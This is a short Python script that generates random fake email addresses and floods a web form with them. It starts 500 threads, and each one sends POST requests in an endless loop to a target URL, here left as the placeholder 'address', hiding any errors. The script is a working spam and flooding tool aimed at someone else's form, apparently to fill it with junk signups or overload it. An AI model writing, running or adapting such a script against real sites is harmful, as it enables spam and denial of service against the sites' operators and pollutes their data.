import requests
import numpy as np
import threading as th
from random import choice

with open('./names.txt') as f:
    names = f.read().splitlines()
    names = [x for x in names]

domains = ["gmail","yahoo","hotmail","live","pornhub","tomato",
           "bigdeal","hulu","netflix","sixsix","badboys","atah",
           "india","xvideos","xnxx","circles","protonmail","mailbox",
           "mail","pm","yolo","MIT","harvard","france","australia"]
numbers = [x for x in range(0,10)]
amount = [x for x in range(0,6)]
sname_amount = [0,1]
snum_amount = [0,0,0,1,2,0,0,0]

def spam():
    c = 0
    while True:
        c += 1
        nums = "".join([str(choice(numbers)) for x in range(choice(amount))])
        snums = "".join([str(choice(numbers)) for x in range(choice(snum_amount))])
        sname = "".join([str(choice(names)) for x in range(choice(sname_amount))])
        email = f'{snums}{choice(names)}{nums}{sname}@{choice(domains)}.com'
        try:
            url = 'address'
            obj = {'e': email,
                   'action': 'form'}
            r = requests.post(url, data=obj)
            if c % 10 == 0:
                print(
                    f"POST Request made, status code: {r.status_code}, reason: {r.reason}, run number: {c}, content: {obj['e']}")
        except:
            continue

for i in range(500):
    th.Thread(target=spam).start()
